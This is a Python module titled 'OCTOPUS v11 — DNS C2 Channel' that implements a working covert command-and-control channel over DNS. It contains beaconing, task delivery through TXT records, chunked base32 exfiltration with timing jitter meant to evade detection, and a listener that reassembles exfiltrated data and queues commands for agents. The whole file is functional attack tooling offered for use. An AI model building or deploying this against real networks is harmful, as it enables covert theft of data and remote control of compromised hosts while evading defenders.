"""
OCTOPUS v11 — DNS C2 Channel.

Provides covert command-and-control communication over DNS.
Supports both DNS TXT record exfiltration and DNS subdomain beaconing.

Architecture:
  - Outbound data is base32-encoded and split into DNS-safe labels (≤63 chars)
  - Inbound tasks are received via DNS TXT record responses
  - Exfiltration uses sequential DNS A/TXT queries with chunked data
  - Listener binds on UDP port 53 to receive beacon queries

Protocol:
  beacon:  <b32_data>.<agent_id>.<domain>  →  TXT response with tasking
  exfil:   <seq>.<b32_chunk>.<agent_id>.<domain>  →  A record ACK
"""

import os
import base64
import hashlib
import logging
import socket
import struct
import threading
import time
from typing import Dict, List, Optional, Tuple

logger = logging.getLogger("octopus.c2.channels.dns")

# DNS constants
_MAX_LABEL_LEN = 63       # RFC 1035: max label length
_MAX_NAME_LEN = 253       # RFC 1035: max total domain name length
_DNS_HEADER_LEN = 12      # Standard DNS header size
_DNS_TYPE_A = 1
_DNS_TYPE_TXT = 16
_DNS_CLASS_IN = 1


def _b32_encode_safe(data: bytes) -> str:
    """Base32-encode data and strip padding for DNS-safe labels.

    Uses lowercase base32 without padding characters to produce
    DNS-compatible label strings.

    Args:
        data: Raw bytes to encode.

    Returns:
        Lowercase base32 string without '=' padding.
    """
    return base64.b32encode(data).decode("ascii").rstrip("=").lower()


def _b32_decode_safe(s: str) -> bytes:
    """Decode DNS-safe base32 string back to bytes.

    Re-adds the padding stripped during encoding.

    Args:
        s: Base32-encoded string (no padding, any case).

    Returns:
        Decoded raw bytes.
    """
    s = s.upper()
    # Re-add padding
    pad_len = (8 - len(s) % 8) % 8
    s += "=" * pad_len
    return base64.b32decode(s)


class DNSChannel:
    """DNS-based C2 communication channel.

    Provides covert C2 communication by encoding data within DNS queries
    and responses. Supports TXT record exfiltration and subdomain beaconing.

    This channel is designed for environments where HTTP/HTTPS egress is
    blocked but DNS resolution is permitted (very common in corporate
    networks).

    Usage:
        channel = DNSChannel("c2.example.com")
        channel.send_beacon("AGT-123", b'{"status": "alive"}')
        tasks = channel.receive_task("AGT-123")
        channel.exfiltrate(sensitive_data, chunk_size=180)

    Attributes:
        domain: The C2 domain used for DNS communication.
        record_type: DNS record type for responses ('TXT' or 'A').
        _pending_tasks: In-memory task queue per agent (listener mode).
        _received_data: In-memory exfil reassembly buffer (listener mode).
        _listener_running: Whether the DNS listener is active.
    """

    def __init__(self, domain: str, record_type: str = "TXT") -> None:
        """Initialize DNS C2 channel.

        Args:
            domain: C2 domain to use for DNS queries (e.g., 'c2.example.com').
            record_type: DNS record type for responses. 'TXT' for text data,
                         'A' for IP-encoded data. Defaults to 'TXT'.

        Raises:
            ValueError: If record_type is not 'TXT' or 'A'.
        """
        if record_type not in ("TXT", "A"):
            raise ValueError(f"Unsupported record type: {record_type}. Use 'TXT' or 'A'.")

        self.domain: str = domain.rstrip(".")
        self.record_type: str = record_type

        # Listener state (server-side)
        self._pending_tasks: Dict[str, List[dict]] = {}
        self._received_data: Dict[str, Dict[int, bytes]] = {}
        self._listener_running: bool = False
        self._listener_thread: Optional[threading.Thread] = None
        self._lock: threading.Lock = threading.Lock()

        logger.info("DNS C2 channel initialized: domain=%s, record_type=%s",
                     self.domain, self.record_type)

    def encode_data(self, data: bytes) -> List[str]:
        """Split data into DNS-safe labels (≤63 chars each).

        Encodes raw bytes using base32 and splits the result into
        chunks that fit within DNS label length constraints.

        Args:
            data: Raw bytes to encode into DNS labels.

        Returns:
            List of DNS-safe label strings, each ≤63 characters.

        Example:
            >>> ch = DNSChannel("c2.example.com")
            >>> labels = ch.encode_data(b"Hello, World!")
            >>> all(len(l) <= 63 for l in labels)
            True
        """
        encoded = _b32_encode_safe(data)
        labels: List[str] = []
        for i in range(0, len(encoded), _MAX_LABEL_LEN):
            labels.append(encoded[i:i + _MAX_LABEL_LEN])
        return labels

    def decode_data(self, labels: List[str]) -> bytes:
        """Reassemble data from DNS labels.

        Concatenates the labels and decodes the base32 payload back
        to raw bytes.

        Args:
            labels: List of DNS label strings to reassemble.

        Returns:
            Decoded raw bytes.

        Raises:
            ValueError: If labels contain invalid base32 characters.

        Example:
            >>> ch = DNSChannel("c2.example.com")
            >>> original = b"test data for DNS"
            >>> ch.decode_data(ch.encode_data(original)) == original
            True
        """
        combined = "".join(labels)
        return _b32_decode_safe(combined)

    def send_beacon(self, agent_id: str, data: bytes) -> Optional[str]:
        """Encode and send beacon data as a DNS query subdomain.

        Constructs a DNS query where the beacon data is encoded in the
        subdomain labels. The full query name format is:
            <b32_label_0>.<b32_label_1>...<agent_id>.<domain>

        Args:
            agent_id: Unique agent identifier (e.g., 'AGT-123').
            data: Beacon payload to send (JSON bytes, status info, etc.).

        Returns:
            The constructed DNS query name, or None on failure.
        """
        labels = self.encode_data(data)

        # Sanitize agent_id for DNS (replace non-alphanumeric)
        safe_agent = agent_id.replace("-", "").lower()[:32]

        # Build query name: <data_labels>.<agent_id>.<domain>
        parts = labels + [safe_agent, self.domain]
        query_name = ".".join(parts)

        # Validate total length
        if len(query_name) > _MAX_NAME_LEN:
            logger.warning(
                "Beacon query too long (%d chars), truncating data",
                len(query_name)
            )
            # Truncate data labels to fit
            max_data_len = _MAX_NAME_LEN - len(safe_agent) - len(self.domain) - 2
            encoded = _b32_encode_safe(data)[:max_data_len]
            labels = [encoded[i:i + _MAX_LABEL_LEN]
                      for i in range(0, len(encoded), _MAX_LABEL_LEN)]
            parts = labels + [safe_agent, self.domain]
            query_name = ".".join(parts)

        try:
            # Perform DNS resolution (the query itself is the data channel)
            if self.record_type == "TXT":
                _dns_query_txt(query_name)
            else:
                _dns_query_a(query_name)
            logger.debug("Beacon sent for agent %s: %s", agent_id, query_name)
            return query_name
        except Exception as exc:
            logger.error("Beacon send failed for agent %s: %s", agent_id, exc)
            return None

    def receive_task(self, agent_id: str) -> Optional[dict]:
        """Receive pending tasks for an agent via DNS TXT response.

        In listener mode, returns the next queued task for the agent.
        In client mode, performs a DNS TXT query to the C2 domain and
        parses the response.

        Args:
            agent_id: Agent identifier to fetch tasks for.

        Returns:
            Task dictionary with 'task_id' and 'command' keys,
            or None if no tasks are pending.
        """
        # Server-side: return from in-memory queue
        with self._lock:
            tasks = self._pending_tasks.get(agent_id, [])
            if tasks:
                task = tasks.pop(0)
                logger.info("Task dispatched to agent %s: %s",
                            agent_id, task.get("task_id", "unknown"))
                return task

        # Client-side: query DNS for tasks
        safe_agent = agent_id.replace("-", "").lower()[:32]
        query_name = f"task.{safe_agent}.{self.domain}"

        try:
            txt_records = _dns_query_txt(query_name)
            if txt_records:
                import json
                raw = "".join(txt_records)
                decoded = _b32_decode_safe(raw)
                task = json.loads(decoded)
                logger.info("Task received for agent %s via DNS TXT", agent_id)
                return task
        except Exception as exc:
            logger.debug("No task available for agent %s: %s", agent_id, exc)

        return None

    def queue_task(self, agent_id: str, task_id: str, command: str) -> None:
        """Queue a task for an agent (server-side, listener mode).

        Args:
            agent_id: Target agent identifier.
            task_id: Unique task identifier.
            command: Command string for the agent to execute.
        """
        with self._lock:
            if agent_id not in self._pending_tasks:
                self._pending_tasks[agent_id] = []
            self._pending_tasks[agent_id].append({
                "task_id": task_id,
                "command": command,
            })
        logger.info("Task %s queued for agent %s", task_id, agent_id)

    def exfiltrate(self, data: bytes, chunk_size: int = 180) -> int:
        """Exfiltrate data via sequential DNS queries.

        Splits data into chunks, base32-encodes each chunk, and sends
        it as a DNS subdomain query. Each query includes a sequence
        number for reassembly.

        Query format: <seq_hex>.<b32_chunk>.<exfil>.<domain>

        Args:
            data: Raw data to exfiltrate.
            chunk_size: Maximum raw bytes per DNS query. Defaults to 180
                        (produces ~288 base32 chars, fitting in ~5 labels).

        Returns:
            Number of DNS queries sent (chunks transmitted).
        """
        total_chunks = (len(data) + chunk_size - 1) // chunk_size
        queries_sent = 0

        # Add integrity hash as header
        data_hash = hashlib.sha256(data).hexdigest()[:16]

        for seq in range(total_chunks):
            start = seq * chunk_size
            end = min(start + chunk_size, len(data))
            chunk = data[start:end]

            labels = self.encode_data(chunk)
            seq_label = f"{seq:04x}"
            total_label = f"{total_chunks:04x}"

            parts = [seq_label, total_label] + labels + ["exfil", self.domain]
            query_name = ".".join(parts)

            # Truncate if needed
            if len(query_name) > _MAX_NAME_LEN:
                logger.warning("Exfil chunk %d too long, reducing chunk_size", seq)
                # Recursive call with smaller chunk size
                return self.exfiltrate(data, chunk_size=chunk_size // 2)

            try:
                _dns_query_a(query_name)
                queries_sent += 1
                logger.debug("Exfil chunk %d/%d sent", seq + 1, total_chunks)
            except Exception as exc:
                logger.error("Exfil chunk %d failed: %s", seq, exc)

            # Rate limiting to avoid detection
            time.sleep(0.1 + (hash(chunk) % 100) / 1000.0)

        # Send completion marker with hash
        completion = f"done.{data_hash}.exfil.{self.domain}"
        try:
            _dns_query_a(completion)
        except Exception:
            pass

        logger.info("Exfiltration complete: %d chunks, %d bytes, hash=%s",
                     queries_sent, len(data), data_hash)
        return queries_sent

    def start_listener(self, port: int = 53) -> None:
        """Start DNS server for receiving beacons and exfil data.

        Binds a UDP socket on the specified port and spawns a daemon
        thread to handle incoming DNS queries. Queries to our domain
        are parsed for beacon data and exfiltration chunks.

        Args:
            port: UDP port to listen on. Defaults to 53 (standard DNS).
                  Requires root/sudo for ports < 1024.

        Raises:
            OSError: If the port is already in use or permission denied.
            RuntimeError: If a listener is already running.
        """
        if self._listener_running:
            raise RuntimeError("DNS listener is already running")

        self._listener_running = True
        self._listener_thread = threading.Thread(
            target=self._listener_loop,
            args=(port,),
            daemon=True,
            name="octopus-dns-listener",
        )
        self._listener_thread.start()
        logger.info("DNS C2 listener started on UDP port %d", port)

    def stop_listener(self) -> None:
        """Stop the DNS listener."""
        self._listener_running = False
        if self._listener_thread is not None:
            self._listener_thread.join(timeout=5)
            self._listener_thread = None
        logger.info("DNS C2 listener stopped")

    def get_exfil_data(self, agent_id: str) -> Optional[bytes]:
        """Retrieve reassembled exfiltration data for an agent.

        Args:
            agent_id: Agent identifier whose exfil data to retrieve.

        Returns:
            Reassembled bytes if all chunks received, None otherwise.
        """
        with self._lock:
            chunks = self._received_data.get(agent_id, {})
            if not chunks:
                return None
            # Check if we have all sequential chunks
            max_seq = max(chunks.keys())
            if all(i in chunks for i in range(max_seq + 1)):
                data = b"".join(chunks[i] for i in range(max_seq + 1))
                del self._received_data[agent_id]
                return data
        return None

    def _listener_loop(self, port: int) -> None:
        """Main DNS listener loop (runs in daemon thread).

        Receives UDP DNS queries, parses them, extracts beacon/exfil
        data, and sends appropriate DNS responses.

        Args:
            port: UDP port to bind on.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(2.0)

        try:
            sock.bind(("0.0.0.0", port))
        except OSError as exc:
            logger.error("Failed to bind DNS listener on port %d: %s", port, exc)
            self._listener_running = False
            return

        logger.info("DNS listener bound on 0.0.0.0:%d", port)

        while self._listener_running:
            try:
                data, addr = sock.recvfrom(4096)
                if len(data) < _DNS_HEADER_LEN:
                    continue

                try:
                    query_name, qtype = _parse_dns_query(data)
                except Exception:
                    continue

                if not query_name.endswith(self.domain):
                    # Not our domain — ignore
                    continue

                # Strip our domain suffix to get the data portion
                prefix = query_name[:-(len(self.domain) + 1)]
                labels = prefix.split(".")

                response = self._handle_query(labels, query_name, qtype, data, addr)

                if response is not None:
                    sock.sendto(response, addr)

            except socket.timeout:
                continue
            except Exception as exc:
                logger.error("DNS listener error: %s", exc)

        sock.close()
        logger.info("DNS listener loop exited")

    def _handle_query(
        self,
        labels: List[str],
        query_name: str,
        qtype: int,
        raw_query: bytes,
        addr: Tuple[str, int],
    ) -> Optional[bytes]:
        """Process an incoming DNS query and generate a response.

        Parses beacon data and exfiltration chunks from the query
        labels and builds an appropriate DNS response.

        Args:
            labels: Subdomain labels (excluding our domain).
            query_name: Full query name.
            qtype: DNS query type (A=1, TXT=16).
            raw_query: Raw DNS query packet.
            addr: Source address tuple (ip, port).

        Returns:
            DNS response bytes, or None to silently drop.
        """
        if not labels:
            return _build_dns_response(raw_query, query_name, qtype)

        # Exfiltration data: <seq>.<total>.<b32_data...>.exfil
        if labels[-1] == "exfil" and len(labels) >= 3:
            try:
                seq = int(labels[0], 16)
                # total = int(labels[1], 16)  # Available for reassembly validation
                data_labels = labels[2:-1]
                chunk_data = self.decode_data(data_labels)

                agent_key = f"{addr[0]}"
                with self._lock:
                    if agent_key not in self._received_data:
                        self._received_data[agent_key] = {}
                    self._received_data[agent_key][seq] = chunk_data

                logger.debug("Exfil chunk %d received from %s", seq, addr[0])
            except Exception as exc:
                logger.debug("Failed to parse exfil query: %s", exc)

            return _build_dns_response(raw_query, query_name, qtype)

        # Task request: task.<agent_id>
        if labels[0] == "task" and len(labels) >= 2:
            agent_id = labels[1]
            task = None
            with self._lock:
                tasks = self._pending_tasks.get(agent_id, [])
                if tasks:
                    task = tasks.pop(0)

            if task is not None:
                import json
                task_bytes = json.dumps(task).encode("utf-8")
                task_encoded = _b32_encode_safe(task_bytes)
                return _build_dns_txt_response(raw_query, query_name, task_encoded)

            return _build_dns_response(raw_query, query_name, qtype)

        # Beacon: <b32_data...>.<agent_id>
        if len(labels) >= 2:
            agent_id = labels[-1]
            data_labels = labels[:-1]
            try:
                beacon_data = self.decode_data(data_labels)
                logger.info("Beacon received from agent %s at %s: %d bytes",
                            agent_id, addr[0], len(beacon_data))
            except Exception as exc:
                logger.debug("Failed to decode beacon data: %s", exc)

            return _build_dns_response(raw_query, query_name, qtype)

        return _build_dns_response(raw_query, query_name, qtype)


# ─── DNS Wire Format Helpers ────────────────────────────────────


def _dns_query_txt(name: str) -> List[str]:
    """Perform a DNS TXT query using the system resolver.

    Args:
        name: DNS name to query.

    Returns:
        List of TXT record strings.

    Raises:
        socket.gaierror: If DNS resolution fails.
    """
    import subprocess
    try:
        result = subprocess.run(
            ["dig", "+short", "TXT", name],
            capture_output=True, text=True, timeout=10,
        )
        records = []
        for line in result.stdout.strip().split("\n"):
            line = line.strip().strip('"')
            if line:
                records.append(line)
        return records
    except (subprocess.TimeoutExpired, FileNotFoundError):
        logger.debug("dig not available, falling back to socket")
        return []


def _dns_query_a(name: str) -> Optional[str]:
    """Perform a DNS A query using the system resolver.

    The query itself is the covert channel — the response is not
    important for data exfiltration.

    Args:
        name: DNS name to query.

    Returns:
        Resolved IP address string, or None.
    """
    try:
        result = socket.getaddrinfo(name, None, socket.AF_INET)
        if result:
            return result[0][4][0]
    except socket.gaierror:
        pass
    return None


def _parse_dns_query(data: bytes) -> Tuple[str, int]:
    """Parse a raw DNS query packet to extract the query name and type.

    Args:
        data: Raw DNS UDP packet bytes.

    Returns:
        Tuple of (query_name, query_type).

    Raises:
        ValueError: If the packet is malformed.
    """
    if len(data) < _DNS_HEADER_LEN:
        raise ValueError("DNS packet too short")

    # Skip header (12 bytes), parse question section
    offset = _DNS_HEADER_LEN
    labels: List[str] = []

    while offset < len(data):
        length = data[offset]
        offset += 1

        if length == 0:
            break
        if offset + length > len(data):
            raise ValueError("DNS label exceeds packet length")

        label = data[offset:offset + length].decode("ascii", errors="replace")
        labels.append(label)
        offset += length

    if offset + 4 > len(data):
        raise ValueError("DNS packet missing QTYPE/QCLASS")

    qtype = struct.unpack("!H", data[offset:offset + 2])[0]
    query_name = ".".join(labels)

    return query_name, qtype


def _build_dns_response(
    query: bytes,
    name: str,
    qtype: int,
    ip: str = "127.0.0.1",
) -> bytes:
    """Build a minimal DNS A-record response.

    Args:
        query: Original DNS query packet (for transaction ID).
        name: Query name for the response.
        qtype: Query type from the original request.
        ip: IP address for the A record response.

    Returns:
        Raw DNS response packet bytes.
    """
    # Transaction ID from query
    tx_id = query[:2]

    # Flags: standard response, no error
    flags = struct.pack("!H", 0x8180)

    # Counts: 1 question, 1 answer, 0 authority, 0 additional
    counts = struct.pack("!HHHH", 1, 1, 0, 0)

    # Question section (copy from query)
    question = query[_DNS_HEADER_LEN:]
    # Find end of question (null label + 4 bytes for QTYPE/QCLASS)
    q_end = _DNS_HEADER_LEN
    while q_end < len(query) and query[q_end] != 0:
        q_end += query[q_end] + 1
    q_end += 5  # null byte + QTYPE (2) + QCLASS (2)
    question = query[_DNS_HEADER_LEN:q_end]

    # Answer section: pointer to name + A record
    answer = struct.pack("!H", 0xC00C)  # Pointer to name in question
    answer += struct.pack("!HHI", _DNS_TYPE_A, _DNS_CLASS_IN, 60)  # TTL=60
    ip_parts = [int(p) for p in ip.split(".")]
    answer += struct.pack("!H", 4)  # RDLENGTH
    answer += struct.pack("!BBBB", *ip_parts)

    return tx_id + flags + counts + question + answer


def _build_dns_txt_response(
    query: bytes,
    name: str,
    txt_data: str,
) -> bytes:
    """Build a DNS TXT record response.

    Args:
        query: Original DNS query packet.
        name: Query name for the response.
        txt_data: Text data to include in the TXT record.
            Will be split into 255-byte chunks per TXT record spec.

    Returns:
        Raw DNS response packet bytes.
    """
    tx_id = query[:2]
    flags = struct.pack("!H", 0x8180)
    counts = struct.pack("!HHHH", 1, 1, 0, 0)

    # Question section
    q_end = _DNS_HEADER_LEN
    while q_end < len(query) and query[q_end] != 0:
        q_end += query[q_end] + 1
    q_end += 5
    question = query[_DNS_HEADER_LEN:q_end]

    # TXT record data: split into 255-byte character strings
    txt_bytes = txt_data.encode("ascii")
    rdata = b""
    for i in range(0, len(txt_bytes), 255):
        chunk = txt_bytes[i:i + 255]
        rdata += struct.pack("!B", len(chunk)) + chunk

    # Answer section
    answer = struct.pack("!H", 0xC00C)  # Pointer to name
    answer += struct.pack("!HHI", _DNS_TYPE_TXT, _DNS_CLASS_IN, 60)
    answer += struct.pack("!H", len(rdata))
    answer += rdata

    return tx_id + flags + counts + question + answer
